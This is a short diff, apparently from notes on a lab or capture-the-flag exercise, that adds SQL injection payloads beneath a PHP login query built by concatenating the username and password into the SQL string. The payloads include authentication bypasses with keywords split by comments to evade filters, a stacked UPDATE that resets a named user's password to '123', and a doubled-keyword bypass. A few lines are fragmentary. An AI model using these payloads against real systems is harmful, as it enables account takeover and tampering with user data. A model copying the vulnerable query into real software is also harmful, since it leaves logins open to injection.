@@ -24,3 +24,12 @@ $sql = "SELECT * FROM users WHERE `username` = '$username' AND `password` = '$pa
 1' O/**/R '1' = '1
 
 1' UN/**/ION ALL SEL/**/ECT * FROM users LIMIT 1--
+kita0421
+UPDATE users SET `password`='123';--
+WHERE some_column=some_value;
+
+```SQL
+' O/**/R '1' = '1; UPDATE users SET `password`= '123' WH/**/ERE `username` = 'kita0421';--
+AS INJECTX WHE/**/RE 1=1 AND 1=1  
+1' OORR '1' = '1' limit 1; --
+```
